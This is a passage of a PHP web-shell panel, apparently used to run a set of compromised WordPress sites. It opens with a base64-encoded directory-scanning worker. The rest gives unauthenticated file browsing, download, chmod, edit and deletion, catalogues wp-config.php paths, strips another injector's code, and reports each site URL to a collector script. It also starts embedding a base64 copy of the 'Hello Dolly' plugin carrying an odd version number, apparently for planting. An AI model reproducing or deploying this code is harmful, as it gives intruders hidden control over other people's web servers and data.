ogICAgfQogICAgaWYgKGluX2FycmF5KCRmbmFtZSwkZnVsbCkpewogICAgcmV0dXJuIHRydWU7CiAgICB9CiAgICByZXR1cm4gZmFsc2U7Cn0KCmZ1bmN0aW9uIEFkZF9UYXNrKCRkaXIpewoJZWNobyAiQWRkICRkaXIgPGJyPlxuIjsKICAgICR0YXNrX2ZpbGUgPSAnX3Rhc2snOwogICAgJGRpciA9IHRyaW0oJGRpcik7CiAgICAkZGlyID0gc3RyX3JlcGxhY2UoJy8vJywnLycsJGRpcik7CiAgICBpZiAoc3RybGVuKCRkaXIpID4gMil7CiAgICAgICAgJHlwb3MgPSBzdHJsZW4oJGRpciktMTsKICAgICAgICBpZigkZGlyWyR5cG9zXSA9PSAnLycpewogICAgICAgICAgICAkZGlyID0gc3Vic3RyKCRkaXIsMCwkeXBvcyk7CiAgICAgICAgfQogICAgfQogICAgaWYgKCFAaXNfcmVhZGFibGUoJGRpcikpe3JldHVybiB0cnVlO30KICAgIGlmIChDaGVja19CYWRfRGlyKCRkaXIpKXtyZXR1cm4gdHJ1ZTt9CiAKICAgIGNsZWFyc3RhdGNhY2hlKCk7CiAgICBpZiAoZmlsZV9leGlzdHMoJHRhc2tfZmlsZSkpewogICAgICAgICRoYW5kbGUgPSBAZm9wZW4oJHRhc2tfZmlsZSwgInIiKTsKICAgICAgICBpZiAoJGhhbmRsZSkgewogICAgICAgICAgICB3aGlsZSAoKCRidWZmZXIgPSBmZ2V0cygkaGFuZGxlLCA0MDk2KSkgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICAkYnVmZmVyID0gdHJpbSgkYnVmZmVyKTsKICAgICAgICAgICAgICAgIGlmKCRkaXIgPT0gJGJ1ZmZlcil7cmV0dXJuIGZhbHNlO30KICAgICAgICAgICAgfQogICAgICAgICAgICBmY2xvc2UoJGhhbmRsZSk7CiAgICAgICAgfQogICAgfSAKCSRmID0gZm9wZW4oJHRhc2tfZmlsZSwiYSIpOwoJZnB1dHMoJGYsIiRkaXIiLiBQSFBfRU9MKTsKCWZjbG9zZSgkZik7Cn0KCmZ1bmN0aW9uIGxvZ193cCgkZmlsZSl7CiAgICAkZiA9IGZvcGVuKCd3cF9sb2cnLCAiYSIpOwogICAgZnB1dHMoJGYsIiRmaWxlXG4iKTsKICAgIGZjbG9zZSgkZik7Cn0KCmZ1bmN0aW9uIGdldF91cmwoJHVybCl7CiRjaCA9IGN1cmxfaW5pdCgkdXJsKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1RJTUVPVVQsIDIwKTsKJHVsdCA9IGN1cmxfZXhlYygkY2gpOwppZigkdWx0KXtyZXR1cm4gJHVsdDt9IGVsc2UgewokdG1wID0gZmlsZV9nZXRfY29udGVudHMoJHVybCk7CnJldHVybiAkdG1wOyAgCn0KfQoKZnVuY3Rpb24gd3JpdGVfbG9nKCR0ZXh0KXsKCiAgICAkZiA9IGZvcGVuKCdiaWdfbG9nJywiYSIpOwogICAgZnB1dHMoJGYsIiR0ZXh0XG4iKTsKICAgIGZjbG9zZSgkZik7Cn0KCmZ1bmN0aW9uIG1hbnVhbF9sb2coJGZpbGUsJGNvZGUpewogICAgJGNvZGUgPSB0cmltKCRjb2RlKTsKICAgICRmID0gZm9wZW4oJ21hbnVhbF9sb2cnLCAiYSIpOwogICAgZnB1dHMoJGYsIiRmaWxlPT09PT0kY29kZVxuIik7CiAgICBmY2xvc2UoJGYpOwp9CgpmdW5jdGlvbiBuZWVkX2NoZWNrKCRmaWxlbmFtZSl7CiAgICBnbG9iYWwgJHBhdHRlcm5zOwoKICAgIGZvcmVhY2ggKCRwYXR0ZXJucyBhcyAkdCkgewogICAgICAgIGlmKHByZWdfbWF0Y2goJHRbJ2ZpbGVuYW1lJ10sICRmaWxlbmFtZSkpewogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gZmFsc2U7Cn0KCmZ1bmN0aW9uIG1vZGlmeSgkZmlsZSl7CiAgICAKLy8gICAgZ2xvYmFsICRleGNlcHRpb25zOwogICAgZ2xvYmFsICRwYXR0ZXJucywgJHBhcmFub2lkOwoKICAgICRmaWxlbmFtZSA9IGJhc2VuYW1lKCRmaWxlKTsKCiAgICAkcGFyYSA9IGZhbHNlOwoKICAgIGlmKGlzc2V0KCRfQ09PS0lFWydwYXJhbm9pZF93b3JrZXInXSkpewogICAgICAgICRwYXJhID0gdHJ1ZTsKICAgIH0KCiAgICBpZighbmVlZF9jaGVjaygkZmlsZW5hbWUpKXsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0gZWxzZSB7CiAgICAgICAgJHRtcCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKTsKCiAgICAgICAgaWYoJHBhcmEpewogICAgICAgICAgICAkcGFyYW5vaWRfdG1wID0gcHJlZ19yZXBsYWNlKCd+XC9cKi4qP1wqXC9+aXNtJywgJycsICR0bXApOwogICAgICAgICAgICAkcGFyYW5vaWRfdG1wID0gcHJlZ19yZXBsYWNlKCd+Ly9bXlxyXG5dKn5pcycsICcnLCAkcGFyYW5vaWRfdG1wKTsKICAgICAgICB9ICAgCiAgICB9CgogICAgZm9yZWFjaCAoJHBhdHRlcm5zIGFzICR0KSB7IAogICAgICAgIGlmKHByZWdfbWF0Y2goJHRbJ2ZpbGVuYW1lJ10sICRmaWxlbmFtZSkpeyAgICAgICAgICAgCiAgICAgICAgaWYgKHByZWdfbWF0Y2goJHRbJ2NvZGUnXSwgJHRtcCkpIHsKCgogICAgICAgICAgICBzd2l0Y2ggKCR0WydhY3Rpb24nXSkgewogICAgICAgICAgICAKCiAgICAgICAgICAgIGNhc2UgImN1dCI6CiAgICAgICAgICAgICAgICBjb3B5KCRmaWxlLCRmaWxlIC4gJy5zdXNwZWN0ZWQnKTsKICAgICAgICAgICAgICAgICR0bXAgPSBwcmVnX3JlcGxhY2UoJHRbJ2NvZGUnXSwgJycsICR0bXApOwogICAgICAgICAgICAgICAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkdG1wKSA9PT0gZmFsc2UpewoKICAgICAgICAgICAgICAgICAgICBpZihjaG1vZCgkZmlsZSwwNzc3KSl7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHRtcCkgPT09IGZhbHNlKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1hbnVhbF9sb2coJGZpbGUsJ3dyaXRlIGVycm9yIGFmdGVyIGN1dCcpOyAgICAKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG1hbnVhbF9sb2coJGZpbGUsJ3dyaXRlIGVycm9yIGFmdGVyIGN1dCcpOyAgICAgCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHdyaXRlX2xvZygiJGZpbGUgY3V0Iik7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBjYXNlICJkZWxldGUiOgogICAgICAgICAgICAgICAgY29weSgkZmlsZSwkZmlsZSAuICcuc3VzcGVjdGVkJyk7CiAgICAgICAgICAgICAgICBpZih1bmxpbmsoJGZpbGUpID09PSBmYWxzZSl7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgJGZkID0gZGlybmFtZSgkZmlsZSk7CiAgICAgICAgICAgICAgICAgICAgaWYoY2htb2QoJGZkLDA3NzcpKXsKICAgICAgICAgICAgICAgICAgICAgICAgaWYodW5saW5rKCRmaWxlKSA9PT0gZmFsc2UpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWFudWFsX2xvZygkZmlsZSwnd3JpdGUgZXJyb3IgYWZ0ZXIgZGVsZXRlJyk7IAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgbWFudWFsX2xvZygkZmlsZSwnd3JpdGUgZXJyb3IgYWZ0ZXIgZGVsZXRlJyk7ICAgIAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB3cml0ZV9sb2coIiRmaWxlIGRlbGV0ZSIpOwogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBjYXNlICJtYW51YWwiOgogICAgICAgICAgICAgICAgbWFudWFsX2xvZygkZmlsZSwgJHRbJ2NvZGUnXSk7CiAgICAgICAgICAgICAgICB3cml0ZV9sb2coIiRmaWxlIG1hbnVhbCIpOwogICAgICAgICAgICAKICAgICAgICAgICAgYnJlYWs7CgogICAgICAgICAgICBjYXNlICJyZXBsYWNlIjoKICAgICAgICAgICAgICAgIGNvcHkoJGZpbGUsJGZpbGUgLiAnLnN1c3BlY3RlZCcpOwogICAgICAgICAgICAgICAgJHRtcCA9IGdldF91cmwoJHRbJ3VybCddKTsKICAgICAgICAgICAgICAgIGlmIChmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHRtcCkgPT09IGZhbHNlKXsKCiAgICAgICAgICAgICAgICAgICAgaWYoY2htb2QoJGZpbGUsMDc3NykpewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICR0bXApID09PSBmYWxzZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYW51YWxfbG9nKCRmaWxlLCd3cml0ZSBlcnJvciBhZnRlciByZXBsYWNlJyk7ICAgIAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgbWFudWFsX2xvZygkZmlsZSwnd3JpdGUgZXJyb3IgYWZ0ZXIgcmVwbGFjZScpOyAgICAgCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHdyaXRlX2xvZygiJGZpbGUgcmVwbGFjZSIpOwogICAgICAgICAgICAKICAgICAgICAgICAgYnJlYWs7CgogICAgICAgICAgICBjYXNlICJjbGVhbiI6CiAgICAgICAgICAgICAgICBjb3B5KCRmaWxlLCRmaWxlIC4gJy5zdXNwZWN0ZWQnKTsKICAgICAgICAgICAgICAgICR0bXAgPSAnPD9waHAgPz4nOwogICAgICAgICAgICAgICAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkdG1wKSA9PT0gZmFsc2UpewoKICAgICAgICAgICAgICAgICAgICBpZihjaG1vZCgkZmlsZSwwNzc3KSl7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHRtcCkgPT09IGZhbHNlKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1hbnVhbF9sb2coJGZpbGUsJ3dyaXRlIGVycm9yIGFmdGVyIGNsZWFuJyk7ICAgIAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgbWFudWFsX2xvZygkZmlsZSwnd3JpdGUgZXJyb3IgYWZ0ZXIgY2xlYW4nKTsgICAgIAogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB3cml0ZV9sb2coIiRmaWxlIGNsZWFuIik7CiAgICAgICAgICAgIAogICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNhc2UgInNyZXBsYWNlIjoKICAgICAgICAgICAgICAgIGNvcHkoJGZpbGUsJGZpbGUgLiAnLnN1c3BlY3RlZCcpOwogICAgICAgICAgICAgICAgJHRtcCA9IHByZWdfcmVwbGFjZSgkdFsnY29kZSddLCAkdFsnbmV3Y29kZSddLCAkdG1wKTsKICAgICAgICAgICAgICAgIGlmIChmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHRtcCkgPT09IGZhbHNlKXsKICAgICAgICAgICAgICAgICAgICBtYW51YWxfbG9nKCRmaWxlLCd3cml0ZSBlcnJvciBhZnRlciBzcmVwbGFjZScpOyAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHdyaXRlX2xvZygiJGZpbGUgc3JlcGxhY2UiKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICAgICAgfQoKICAgICAgICB9CiAgICAgICAgfSAgIAogICAgCiAgICB9CgogICAgaWYoJHBhcmEpewogICAgICAgIGZvcmVhY2ggKCRwYXJhbm9pZCBhcyAkdCkgewogICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgkdFsnY29kZSddLCAkcGFyYW5vaWRfdG1wLCAkbWF0Y2gpKSB7CiAgICAgICAgICAgICAgICBtYW51YWxfbG9nKCRmaWxlLCAncGFyYW5vaWQgJyAuIGltcGxvZGUoJG1hdGNoKSk7CiAgICAgICAgICAgICAgICB3cml0ZV9sb2coIiRmaWxlIG1hbnVhbCIpOyAKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCn0gICAgCgpmdW5jdGlvbiBTY2FuX0RpcigkZGlyKSB7CiAgICBlY2hvICJTY2FuOiAkZGlyIDxicj5cbiI7CiAgICAkb2RpciA9IEBvcGVuZGlyKCRkaXIpOwogICAgd2hpbGUgKCgkZmlsZSA9IEByZWFkZGlyKCRvZGlyKSkgIT09IEZBTFNFKSB7CiAgICAJaWYgKCRmaWxlID09ICcuJyB8fCAkZmlsZSA9PSAnLi4nKXsKICAgICAgICAgICAgY29udGludWU7IAogICAgICAgIH0KICAgICAgICBpZiAoaXNfZGlyKCRkaXIuRElSRUNUT1JZX1NFUEFSQVRPUi4kZmlsZSkgJiYgKCFpc19saW5rKCRkaXIuRElSRUNUT1JZX1NFUEFSQVRPUi4kZmlsZSkpICYmIChAaXNfcmVhZGFibGUoJGRpci5ESVJFQ1RPUllfU0VQQVJBVE9SLiRmaWxlKSkpewogICAgICAgICAgICBBZGRfVGFzaygkZGlyLkRJUkVDVE9SWV9TRVBBUkFUT1IuJGZpbGUpOwogICAgICAgIH0KICAgICAgICBpZigkZmlsZSA9PSAnd3AtY29uZmlnLnBocCcpewogICAgICAgICAgICBsb2dfd3AoJGRpci5ESVJFQ1RPUllfU0VQQVJBVE9SLiRmaWxlKTsKICAgICAgICB9CiAgICAgICAgaWYoKCRmaWxlICE9PSAnX3dvcmtlci5waHAnKSAmJiAoJGZpbGUgIT09ICdjcGwucGhwJykgJiYgKCRmaWxlICE9PSAnaWkucGhwJykgJiYgKCRmaWxlICE9PSAnY29uZmlnX3dwLnBocCcpKXsKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmKCFpc3NldCgkX0NPT0tJRVsnZmFzdF93b3JrZXInXSkpewogICAgICAgICAgICAgICAgbW9kaWZ5KCRkaXIuRElSRUNUT1JZX1NFUEFSQVRPUi4kZmlsZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9ICAgIAogICAgfQogICAgICAgIEBjbG9zZWRpcigkb2Rpcik7Cn0KCiR3b3JrX2NvdW50ID0gMDsKd2hpbGUgKCAkd29ya19jb3VudDw9IDI1KSB7CgkkZGlyID0gR2V0X1Rhc2soKTsKCWlmICgkZGlyID09PSBmYWxzZSl7RGVhZExldHRlcigpO30gZWxzZSB7CgllY2hvICJXb3JraW5nIGRpcjogJGRpciA8YnI+XG4iOwoJU2Nhbl9EaXIoJGRpcik7Cgkkd29ya19jb3VudCsrOwp9Cn0KZWNobyAiPHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZiA9ICdfd29ya2VyLnBocD8nICsgTWF0aC5yYW5kb20oKTs8L3NjcmlwdD4iOwoKCg==')); 
  

 	echo "<script>location.href='_worker.php';
	parent.Worker('f_m','','', '','','file_man');
	</script>";
}

function manage_file(){

	if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
		$fm = $_REQUEST['f'];
  		$file_to_man = base64_decode($_REQUEST['f']);
	} else {
  		die('WTF?');
	}
	
	if(isset($_REQUEST['d']) && '' !== $_REQUEST['d']){
  		$dir = $_REQUEST['d'];
	} else {
  		die('WTF?');
	}

  if(isset($_REQUEST['p']) && '' !== $_REQUEST['p']){
      $param = $_REQUEST['p'];
  } else {
      $param = 'reload';
  }
	$passh = get_perm($file_to_man);
	echo "<style>a {cursor:pointer; color:#00f}</style>";
  	echo "$file_to_man<br><br>$passh<br><br><br>";
  	echo "<a onClick=parent.Worker('c_f','$dir','$fm','0444','$param','edit_box');>[444]</a> ";
  	echo "<a onClick=parent.Worker('c_f','$dir','$fm','0666','$param','edit_box');>[666]</a> ";
  	echo "<a onClick=parent.Worker('c_f','$dir','$fm','0644','$param','edit_box');>[644]</a> ";
  	echo "<a onClick=parent.Worker('c_f','$dir','$fm','0755','$param','edit_box');>[755]</a><br><br>";
  	echo "<a onClick=parent.Worker('r_f','$dir','$fm','','$param','edit_box');>[Renew]</a><br><br>";
  	echo "<a onClick=parent.Worker('d_d','','$fm','','','edit_box');>[Download]</a><br><br>";
  	echo "<a onClick=parent.Worker('e_f','$dir','$fm','','$param','edit_box');>[Edit]</a><br><br>";
}

function download000(){
	if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
		$file_to_down = base64_decode($_REQUEST['f']);
	} else {
		die('WTF?');
	}
  	header('Content-Description: File Transfer');
  	header('Content-Type: application/octet-stream');
  	header('Content-Disposition: attachment; filename="'.basename($file_to_down).'"');
  	header('Expires: 0');
  	header('Cache-Control: must-revalidate');
  	header('Pragma: public');
  	header('Content-Length: ' . filesize($file_to_down));
  	readfile($file_to_down);
}

function chmod_file(){

	if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
		$fm = $_REQUEST['f'];
  		$file_to_man = base64_decode($_REQUEST['f']);
	} else {
  		die('WTF?');
	}
	
	if(isset($_REQUEST['d']) && '' !== $_REQUEST['d']){
  		$dir = $_REQUEST['d'];
	} else {
  		die('WTF?');
	}

  if(isset($_REQUEST['p']) && '' !== $_REQUEST['p']){
      $param = $_REQUEST['p'];
  } else {
      die('WTF?');
  }

	if(isset($_REQUEST['c']) && '' !== $_REQUEST['c']){
  		$mode = 1 * $_REQUEST['c'];
	} else {
  		die('WTF?');
	}

	@chmod($file_to_man, octdec($mode));
  if('reload' == $param){
    echo "<script>parent.Worker('f_m','$dir','', '','$fm','file_man'); parent.Worker('m_f','$dir','$fm', '','','edit_box'); </script>";
  } 
  if('noreload' == $param){
    @clearstatcache();
    $passh = get_perm($file_to_man);
    echo $passh;
  }
}

function renew_file(){
	

	if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
		$fm = $_REQUEST['f'];
  		$file_to_rn = base64_decode($_REQUEST['f']);
	} else {
  		die('WTF?');
	}
	
	if(isset($_REQUEST['d']) && '' !== $_REQUEST['d']){
  		$dir = $_REQUEST['d'];
	} else {
  		die('WTF?');
	}

	if(@is_readable($file_to_rn)){

    	$tmp = file_get_contents($file_to_rn);

    	if(strlen($tmp) > 0) {
    		if (@unlink($file_to_rn)){
        		file_put_contents($file_to_rn, $tmp);
        			echo "<script>parent.Worker('f_m','$dir','', '','$fm','file_man');
	parent.Worker('m_f','$dir','$fm', '','','edit_box');
	</script>";
        		die();
      		} else {
        		die('Can not unlink');
      		}
    	} else {
    		die('Zero read');
	    }
    
  	} else {
    	die('Non readable');
  	}
}

function manual_av(){

	echo "<style>table.blueTable  tbody tr:hover { background: #fff;} table.blueTable  tbody tr { background: #EEEEEE;} </style>
	<script>function check_item(box_id){  document.getElementById(box_id).checked = true;  }

  function OKFunction(md5){
    url = '//127.0.0.1/add_exception.php?md5=' + md5;
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    document.body.appendChild(script);
  }
  function DelOKFunction(md5){
    url = '//127.0.0.1/del_base.php?md5=' + md5;
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    document.body.appendChild(script);
  }
  var md5 = ['aaa'];
  var md5_del = ['aaa'];
  var mmd = new Map(); 
  

  </script>";
  $filter =  explode('|', $_COOKIE['filter']);
  $all_files = file('manual_log');
  $all_files = array_unique($all_files);
  $ii = 0;
  $iii = 0;
  $md_summ = '';
  foreach($all_files as $t){
    $t = trim($t);

    if(strpos($t,'/cache/') > 0){continue;}
    if(strpos($t,'/twig/') > 0){continue;}
    $tex = explode('=====', $t);
    $t = $tex[0];
    if(!file_exists($t)){continue;}

    if(isset($filter[0])){
      if(strpos($t,$filter[0]) > 0){continue;}
    }
    if(isset($filter[1])){
      if(strpos($t,$filter[1]) > 0){continue;}
    }
    if(isset($filter[2])){
      if(strpos($t,$filter[2]) > 0){continue;}
    }
    if(isset($filter[3])){
      if(strpos($t,$filter[3]) > 0){continue;}
    }
    $note = $tex[1];
    $md5 = md5(file_get_contents($t));
    $cf = base64_encode($t);
    $dir = dirname($t);
    $cdir = base64_encode($dir);
    $file = basename($t);
    $fe = wsoViewSize(filesize($t));
    echo "<p id='$md5' class='$md5'><table  class='blueTable' width=100%><tbody><tr>
    <td rowspan=2 style='text-align:center' onClick=check_item('box_$ii');><input type=checkbox id='box_$ii'></td>
    <td colspan=2><input type=text value='$file' style='width:200px;'><input style='width:555px' type=text value=$dir></td></tr>
    <tr><td valign=baseline>
    <input type=button  onClick=\"parent.Worker('e_f','$cdir','$cf','','noreload','edit_box'); check_item('box_$ii');\" value='✐' style='font-size:30px;height:45px;cursor:pointer'>
    <input type=button style='font-size:30px;height:45px;cursor:pointer; color:green' onClick=\"OKFunction('$md5'); check_item('box_$ii');\" value='&#10004;'>
  
    <input type=button style='font-size:30px;height:45px;cursor:pointer; color:blue'  onClick=\"parent.Worker('d_d','$cdir','$cf','','noreload','edit_box'); check_item('box_$ii');\" value='&#11015;'>";
    if(strpos($note, 'paranoid') === false){
      $note = htmlentities($note,ENT_QUOTES);
    }else{
      $note = str_replace('paranoid ', '', $note);
      $find = base64_encode($note);
      $note = htmlentities($note,ENT_QUOTES);
      echo " <input type=button onClick=\"parent.FindEx('$find');\" style='font-size:30px;height:45px;cursor:pointer; color:#f00' value='🔎'>";  
    }
    echo " <input style='width:250px' type=text value='$note'>   	
   	 $fe </td><td align=center>

    <input type=button onClick=\"parent.Worker('d_n','$cdir','$cf','$file','reload','edit_box'); check_item('box_$ii');\" style='font-size:30px;height:45px;cursor:pointer; color:#f00' value='💣' >


    <button onClick=\"parent.Worker('d_5','$cdir','$cf','$md5','reload','edit_box'); DelOKFunction('$md5');\" ><span style='font-size:30px;color:#f00;';>✘</span><span class='a_$md5' style='font-size:15px;';></span></button>


   </td></tr></tbody></table></p>";
  

  $md_summ = $md_summ . $md5 . '|';

  $iii++;  
  if($iii > 50){
    $iii = 0;
    echo "<script src=//127.0.0.1/table.php?md5=$md_summ></script>";

    echo "<script>";
    $mmd = explode('|', $md_summ);
    foreach ($mmd as $mmd5) {
      echo "if(mmd.get('$mmd5') == undefined){mmd.set('$mmd5',1);} else {    mmd.set('$mmd5', mmd.get('$mmd5') +1 );    }";
    }
    echo "</script>";

    $md_summ = '';
  }
  $ii++;  
  }
  echo "<script src=//127.0.0.1/table.php?last=true&md5=$md_summ></script>";
  echo "<script>";
    $mmd = explode('|', $md_summ);
    foreach ($mmd as $mmd5) {
      echo "if(mmd.get('$mmd5') == undefined){mmd.set('$mmd5',1);} else {    mmd.set('$mmd5', mmd.get('$mmd5') +1 );    }";
    }
  echo "</script>";
  echo "<script>

for (let key of mmd.keys()) {

Array.from(document.getElementsByClassName('a_' + key)).forEach(
    function(element, index, array) {
        element.innerHTML = mmd.get(key);
    }
);

}
  </script>";


}

function manual_wp(){

  echo "<style>table.blueTable  tbody tr:hover { background: #fff;} table.blueTable  tbody tr { background: #EEEEEE;} </style>";
  echo "<script>function check_item(box_id){ document.getElementById(box_id).checked = true;  }</script><table class='blueTable'>";
  $all_files = file('wp_log');
  $all_files = array_unique($all_files);
  $ii = 0;
  foreach($all_files as $t){
    $t = trim($t);
    $cdir = base64_encode(dirname($t));
    $cf = base64_encode($t);
    echo "<tr>
    <td><input type=checkbox id='box_$ii'></td>
    <td><input style='cursor:pointer; color:green' type=button onClick=\"parent.Worker('m_wp','$cdir','$cf','','noreload','edit_box'); check_item('box_$ii');\" value='&#10148;'></td>
    <td><input style='width:380px' type=text value=$t></td>
    <td><input style='cursor:pointer;'  type=button onClick=\"parent.Worker('d_w','$cdir','$cf','true','noreload','edit_box'); check_item('box_$ii');\" value='😮'></td>
    <td><input style='cursor:pointer;'  type=button onClick=\"parent.Worker('d_w','$cdir','$cf','false','noreload','edit_box'); check_item('box_$ii');\" value='🤫'></td>
    <td><input style='cursor:pointer;'  type=button onClick=\"parent.Worker('u_w','$cdir','$cf','','noreload','edit_box'); check_item('box_$ii');\" value='🇼'></td>
    <td><input style='cursor:pointer;'  type=button onClick=\"parent.Worker('e_f','$cdir','$cf','','noreload','edit_box'); check_item('box_$ii');\" value='✐'></td>
    <td><input style='cursor:pointer;'  type=button onClick=\"parent.Worker('m_f','$cdir','$cf','','noreload','edit_box'); check_item('box_$ii');\" value='🛠'></td>
    <td><input style='cursor:pointer; color:blue'  type=button onClick=\"parent.Worker('c_z','$cdir','$cf','','noreload','worker_box'); check_item('box_$ii');\" value='&#11014;' ></td>
    <td><input style='cursor:pointer; color:red'  type=button onClick=\"parent.Worker('d_z','$cdir','$cf','','noreload','worker_box'); check_item('box_$ii');\" value='✘' ></td>

    </tr>";
  $ii++;  
  }
  echo '</table>';
}

function make_wp(){

  if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
    $wpc = base64_decode($_REQUEST['f']);
  } else {
    die('WTF?');
  }

  @clearstatcache();

  if(!file_exists($wpc)){
    die('404 file not found');
  }

  $tmp = file_get_contents($wpc);
  
  if (strpos($tmp, 'wp-user-set') > 0){
    echo 'user settings found<br>';
    $tmp = str_replace('wp-user-settings.php', 'wp-settings.php', $tmp);

      $wpc_perm = '';

    if(!is_writeable($wpc)){
      $wpc_perm = substr(decoct(fileperms($wpc)),-4);
      echo $wpc_perm;
      @chmod($wpc, octdec('0666'));
    }

    if(file_put_contents($wpc, $tmp)){
      echo "<font color=green>Succes:</font> clean $wpc<br>";
    } else {
      echo "<font color=red>Error:</font>can't clean $wpc<br>";
      die();
    }

    if ('' !== $wpc_perm){
      @chmod($wpc, octdec($wpc_perm));
    }
    
    $tmp_file = str_replace('wp-config.php', '.error_reporting', $wpc);
    unlink($tmp_file); 
    $tmp_file = str_replace('wp-config.php', '.atime', $wpc);
    unlink($tmp_file);
    $tmp_file = str_replace('wp-config.php', 'wp-user-settings.php', $wpc);
    unlink($tmp_file);
  }

  chdir(dirname($wpc));

  include_once($wpc);

  if(function_exists('get_option')){
    echo '<font color=green>Succes:</font> WP work<br>';
  } else {
    echo '<font color=red>Error:</font> WP not found<br>';
  }

  $site_url = get_option('siteurl');

  if(false === $site_url){
    echo '<font color=red>Error:</font> WP url not found<br>';
    die();
  } else {
    echo "<font color=green>Succes:</font> WP url $site_url<br>";
  }

  if ('/' !== substr($site_url, -1)){
    $site_url = $site_url . '/';
  }

  echo "<br><form action='http://127.0.0.1/insert_to_base.php' method=POST target='_new'>
  <input id=url type=text name=url value='$site_url'><input type=submit value='&#10148;' style='color:green'></form><br>
  ";
  $ssite_url = str_replace('http://', 'https://', $site_url);
  echo "<br><form action='http://127.0.0.1/insert_to_base.php' method=POST target='_new'>
  <input id=url type=text name=url value='$ssite_url'><input type=submit value='&#10148;' style='color:green'></form><br>
  ";
  echo "<a target=_blank href=$site_url>Goto $site_url</a><br><br>";
  echo "<a target=_blank href=$site_url"."pl.php>Goto $site_url"."pl.php</a><br><br>";

  $dolly_code = 'PD9waHAKLyoqCiAqIEBwYWNrYWdlIEhlbGxvX0RvbGx5CiAqIEB2ZXJzaW9uIDExLjcuMgogKi8KLyoKUGx1Z2luIE5hbWU6IEhlbGxvIERvbGx5ClBsdWdpbiBVUkk6IGh0dHA6Ly93b3JkcHJlc3Mub3JnL3BsdWdpbnMvaGVsbG8tZG9sbHkvCkRlc2NyaXB0aW9uOiBUaGlzIGlzIG5vdCBqdXN0IGEgcGx1Z2luLCBpdCBzeW1ib2xpemVzIHRoZSBob3BlIGFuZCBlbnRodXNpYXNtIG9mIGFuIGVudGlyZSBnZW5lcmF0aW9uIHN1bW1lZCB1cCBpbiB0d28gd29yZHMgc3VuZyBtb3N0IGZhbW91c2x5IGJ5IExvdWlzIEFybXN0cm9uZzogSGVsbG8sIERvbGx5LiBXaGVuIGFjdGl2YXRlZCB5b3Ugd2lsbCByYW5kb21seSBzZWUgYSBseXJpYyBmcm9tIDxjaXRlPkhlbGxvLCBEb2xseTwvY2l0ZT4gaW4gdGhlIHVwcGVyIHJpZ2h0IG9mIHlvdXIgYWRtaW4gc2NyZWVuIG9uIGV2ZXJ5IHBhZ2UuCkF1dGhvcjogTWF0dCBNdWxsZW53ZWcKVmVyc2lvbjogMTEuNy4yCkF1dGhvciBVUkk6IGh0dHA6Ly9tYS50dC8KKi8KCmZ1bmN0aW9uIGhlbGxvX2RvbGx5X2dldF9seXJpYygpIHsKCS8qKiBUaGVzZSBhcmUgdGh